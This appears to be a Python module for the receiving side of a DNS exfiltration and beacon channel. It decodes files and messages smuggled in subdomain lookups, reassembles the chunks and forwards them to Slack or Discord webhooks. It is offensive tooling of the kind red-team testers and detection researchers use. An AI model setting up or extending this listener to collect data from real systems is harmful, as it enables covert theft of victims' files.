import os, base62
from datetime import datetime, timedelta
from dotenv import load_dotenv; load_dotenv()

import modules.database as db
import modules.queries  as queries

import modules.postoffice as Postoffice
from modules.serialize import deserialize_from_header 


# Global Variables
SLACK_WEBHOOK   = os.getenv("SLACK_WEBHOOK")
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")

WEBHOOKS = [ SLACK_WEBHOOK, DISCORD_WEBHOOK ]

# For files, use a Database. Store recent messages in RAM. 
SEEN_SHA = {  } # SHA : file_id
COOLDOWN = {  } # Message : timestamp


def handle_exfil( domain : str ):
    """
    Parse & Handle the exfiltrated data received from the Domain Lookup.
    Will send the result to Discord, if a Discord webhook is provided.
    """
    
    global SEEN_SHA
    
    #  Domain format for Exfil:
    #      DATA_PART.ID_PART.SHA_PART.exfil.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          First request:     Should include the filename for storing and size. 
    #          Second and onward: Should include the sliced up data for storing.
    #          
    #      ID_PART (base62 encoded):
    #          The slices order number 1 .. N           
    #      
    #      SHA_PART:  
    #          The SHA1 for the file.
    #     
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    data_part = subdomains[ 0 ]
    id_part   = subdomains[ 1 ]
    sha_part  = subdomains[ 2 ]
    
    if str(id_part) == "0":
        data = deserialize_from_header(data_part)
        
        filename = data["name"]
        filesize = data["size"]
        
        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )

        if file_id != []:
            return 
        
        db.insert_data(
            queries.insert_into_files,
            (filename, filesize, sha_part)
        )
    
        SEEN_SHA[ sha_part ] = db.query_database( queries.get_fileid_with_sha, (sha_part,) )
        
    if sha_part in SEEN_SHA and id_part != 0:
        
        # Insert chunks
        db.insert_data(
            queries.insert_into_filechunk,
            ( sha_part, id_part, data_part )
        )
        
        # Check if all chunks have been retrieved
        file_size    = db.query_database( queries.get_size_with_sha, (sha_part,) )[0][0]
        chunk_amount = db.query_database( queries.check_filechunks,  (sha_part,) )[0][0]
        if chunk_amount - 1 != file_size:
            return
        
        
        # If they're, reconstruct the file
        chunks     = db.query_database( queries.get_filechunks, (sha_part,) )
            
        all_chunks = "".join([(chunk[0], chunk[1])[1] for chunk in chunks])
        numbers = base62.decode( all_chunks )
            
        file_data = numbers.to_bytes((numbers.bit_length() + 7) // 8, "big")
        file_name = db.query_database( queries.get_name_with_sha, (sha_part,) )[0][0]
            
        # Prevent duplicate send
        file_sent_previously = db.query_database( queries.get_sent_status )
        if file_sent_previously != []:
            return
        
        # Send the reconstructed file
        file_sent = Postoffice.send(
            WEBHOOKS,
            Postoffice.Discord_message( 
                files   = [ (file_name, file_data) ] 
            )
        )

        if not file_sent:
            print( "Error: Could not send message." )
            return
        
        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )[0][0]
        
        _ = db.insert_data(
            queries.insert_into_sentlog,
            (file_id,1)
        )
        
    
    return


def handle_beacon( domain : str ):
    """
    Parse & Handle the beacon data received from the Domain Lookup.
    Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
    """
    
    global COOLDOWN
    
    #  Domain format for Beacon:
    #      DATA_PART.beacon.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          Should include the transferable message or payload.
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    data_part = subdomains[ 0 ]
    message   = str(base62.decodebytes( data_part ).decode())
    
    first_appearance = True
    if message in COOLDOWN:
        first_appearance = False
    
    if message not in COOLDOWN:
        COOLDOWN[ message ] = datetime.now()
    
    if (datetime.now() - COOLDOWN[ message ] >= timedelta(minutes=5)) or first_appearance:
        COOLDOWN[ message ] = datetime.now()
        Postoffice.send(
            WEBHOOKS,
            Postoffice.Slack_message( message ),
            Postoffice.Discord_message( message )
        )
    
    return

def handle_plaintext( domain : str ):
    """
    Parse & Handle the plaintext messages received from the Domain Lookup.
    Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
    """
    
    global COOLDOWN
    
    #  Domain format for Plaintext:
    #      DATA_PART.plaintxt.example.tld
    #  
    #      DATA_PART (plaintext):
    #          Should include the transferable message as is.
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]

    # TODO: Unify this & Beacon!
    message  = subdomains[ 0 ]
    
    first_appearance = True
    if message in COOLDOWN:
        first_appearance = False
    
    if message not in COOLDOWN:
        COOLDOWN[ message ] = datetime.now()
    
    if (datetime.now() - COOLDOWN[ message ] >= timedelta(minutes=5)) or first_appearance:
        COOLDOWN[ message ] = datetime.now()
        Postoffice.send(
            WEBHOOKS,
            Postoffice.Slack_message( message ),
            Postoffice.Discord_message( message )
        )
    
    return
